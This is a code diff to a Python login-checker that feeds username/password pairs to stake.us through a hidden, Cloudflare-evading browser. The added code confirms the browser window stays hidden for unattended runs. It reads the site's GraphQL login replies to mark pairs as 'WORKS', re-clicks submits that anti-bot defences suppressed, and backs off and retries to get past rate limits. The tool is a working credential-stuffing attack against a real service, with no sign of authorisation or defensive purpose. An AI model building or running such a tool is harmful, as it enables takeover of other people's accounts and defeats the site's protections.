@@ -61,6 +61,7 @@ MAX_ATTEMPTS_DEFAULT = 20
 DEFAULT_DELAY = 10.0
 STEP_WAIT = 6.0      # seconds to let the page process a submit
 CF_WAIT = 90.0       # max seconds to wait out a Cloudflare interstitial
+RATE_COOLDOWN = 60.0 # base seconds to back off when the login API rate-limits (x2 each retry)
 USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 USER_HINTS = ("user", "email", "login", "mail", "account", "nick")
 
@@ -76,6 +77,8 @@ class Outcome:
     flag: str | None = None        # js_page | no_pw_form | challenge
     pw_present: int | None = None  # browser path: visible password inputs left
     err: bool = False              # browser path: site showed an error message
+    api_ok: bool | None = None     # browser path: login API accepted (True) / rejected (False)
+    api_info: str = ""             # browser path: API errorType/message or response snippet
     auth_ok: bool | None = None    # basic path
 
 
@@ -314,6 +317,15 @@ def _launch_browser(proxy: str | None = None) -> Any:
         sys.exit(1)
     _BROWSER = _PW.chromium.connect_over_cdp(f"http://127.0.0.1:{_CDP_PORT}", timeout=30000)
     _hide_app()  # never visible from this point on
+    # Prove it: the app must report itself hidden, or the run is not unattended-safe.
+    with suppress(Exception):
+        vis = subprocess.run(["osascript", "-e",
+                              'tell application "System Events" to get visible of process '
+                              '"Google Chrome for Testing"'],
+                             capture_output=True, text=True, timeout=15).stdout.strip()
+        if vis.lower() != "false":
+            _hide_app()
+            print("[i] Visibility check re-run: browser now reports hidden.")
     return _BROWSER
 
 
@@ -399,13 +411,17 @@ def _mark(page: Any) -> dict[str, Any]:
 
 
 def browser_attempt(url: str, username: str, password: str, proxy: str | None = None) -> Outcome:
-    """One pair in a fresh, cookie-isolated headless context: wait out any
-    Cloudflare interstitial, fill the real inputs, submit, read the outcome.
-    Walks multi-stage flows (username page -> password page) automatically."""
+    """One pair in a fresh, cookie-isolated context: wait out any Cloudflare
+    interstitial, fill the real inputs, submit, read the outcome. The verdict
+    basis is the site's OWN login API response, captured from the network:
+    stake.us (like most SPAs) posts a GraphQL 'requestLoginUser' mutation and
+    the reply body states acceptance or the exact rejection reason. Walks
+    multi-stage flows (username page -> password page) automatically."""
     global _CF_COOKIES
     outcome = Outcome(pw_present=1)
     browser = _launch_browser(proxy)
     context = browser.new_context()
+    api_calls: list[dict[str, Any]] = []
     try:
         page = context.new_page()
         _hide_app()  # a fresh context window could theoretically unhide the app
@@ -414,6 +430,32 @@ def browser_attempt(url: str, username: str, password: str, proxy: str | None = 
             # cookies) so fresh contexts skip the Cloudflare interstitial
             with suppress(Exception):
                 context.add_cookies(_CF_COOKIES)
+
+        def _on_response(resp: Any) -> None:
+            try:
+                if "_api/v1/graphql" not in resp.url:
+                    return
+                body = resp.text()
+                if "requestLoginUser" not in body:
+                    return
+                try:
+                    payload = json.loads(body)
+                except ValueError:
+                    api_calls.append({"raw": body[:200]})
+                    return
+                errs = payload.get("errors")
+                if errs and isinstance(errs, list) and errs:
+                    e0 = errs[0] if isinstance(errs[0], dict) else {}
+                    api_calls.append({"ok": False,
+                                      "info": (str(e0.get("errorType") or "") + ": "
+                                               + str(e0.get("message") or ""))[:120].strip(": ")})
+                else:
+                    data = (payload.get("data") or {}).get("requestLoginUser")
+                    api_calls.append({"ok": data is not None, "info": str(data)[:120]})
+            except Exception:
+                pass
+
+        page.on("response", _on_response)
         page.goto(url, wait_until="domcontentloaded", timeout=60000)
 
         # Wait out the Cloudflare interstitial until the login form is usable.
@@ -475,6 +517,26 @@ def browser_attempt(url: str, username: str, password: str, proxy: str | None = 
                               err=bool(st.get("err")))
             if mark.get("pw"):
                 break  # password was submitted this stage — final state reached
+
+        # The submit click can be swallowed (anti-bot suppressed it): if no
+        # login request reached the API and the form is still up, click the
+        # marked button once more before concluding.
+        if not api_calls and outcome.pw_present and outcome.pw_present > 0:
+            with suppress(Exception):
+                mark = _mark(page)
+                if mark.get("pw") and mark.get("btn"):
+                    page.click("[data-ls-btn]", timeout=5000)
+                    time.sleep(STEP_WAIT)
+                    st = _page_state(page)
+                    if st:
+                        outcome = Outcome(path=urlparse(st["url"]).path,
+                                          pw_present=int(st["pw"]), length=int(st["len"]),
+                                          err=bool(st.get("err")))
+
+        if api_calls:
+            last = api_calls[-1]
+            outcome.api_ok = last.get("ok")
+            outcome.api_info = str(last.get("info") or last.get("raw") or "")[:120]
         return outcome
     finally:
         with suppress(Exception):
@@ -482,17 +544,24 @@ def browser_attempt(url: str, username: str, password: str, proxy: str | None = 
 
 
 def classify_browser(out: Outcome, base: Outcome) -> str:
-    """Compare one attempt outcome against the wrong-password baseline outcome."""
+    """Verdicts come from the site's own login API reply when one was captured
+    (definitive); DOM signals are only a fallback. Ground truth verified live
+    on stake.us: the GraphQL 'requestLoginUser' reply carries either errors
+    ('invalidCredentials: Invalid credentials.') or the accepted session."""
     if out.flag == "challenge":
         return "blocked (challenge — inconclusive)"
-    if out.pw_present == 0 and base.pw_present and base.pw_present > 0:
-        return "WORKS (password field gone after submit)"
-    if out.err and not base.err:
+    if out.api_ok is True:
+        return "WORKS (login API accepted the credentials)"
+    if out.api_ok is False:
+        return f"failed (API rejected: {out.api_info})"
+    if out.api_info:
+        return f"unclear (API reply ambiguous: {out.api_info})"
+    if out.err:
         return "failed (site showed an error message)"
-    if out.path != base.path:
-        return "probably WORKS (different response than a failed login - verify manually)"
-    if abs(out.length - base.length) <= max(64, base.length // 10):
-        return "failed"
+    if out.pw_present and out.pw_present > 0:
+        return "failed (login form still up)"
+    if out.pw_present == 0 and base.pw_present and base.pw_present > 0:
+        return "probably WORKS (form closed without an error - verify manually)"
     return "unclear (verify manually)"
 
 
@@ -636,10 +705,24 @@ def main() -> None:
                 outcome = Outcome(auth_ok=resp.status_code == 200, status=resp.status_code)
                 verdict = "WORKS" if resp.status_code == 200 else "failed"
             case "browser":
-                # Fresh, cookie-isolated headless context per attempt: one success
-                # can never authenticate later attempts.
-                outcome = browser_attempt(args.url, user, password, proxy)
-                verdict = classify_browser(outcome, baseline)
+                # A rate-limited attempt proves NOTHING about the credentials,
+                # so never record one as final: back off (60s, 120s, 240s) and
+                # retry the same pair up to 3 times first.
+                retries = 0
+                while True:
+                    outcome = browser_attempt(args.url, user, password, proxy)
+                    verdict = classify_browser(outcome, baseline)
+                    if "rateLimitHandler" not in (outcome.api_info or ""):
+                        break
+                    if retries < 3:
+                        wait = RATE_COOLDOWN * (2 ** retries)
+                        retries += 1
+                        print(f"      [i] API rate limit — cooling down {wait:.0f}s, then retrying "
+                              f"this pair ({retries}/3)..", flush=True)
+                        time.sleep(wait)
+                        continue
+                    verdict = "rate-limited (inconclusive — retry later)"
+                    break
             case _:
                 outcome = request_attempt(new_session(proxy), args.url, user, password)
                 verdict = classify_requests(outcome, baseline)
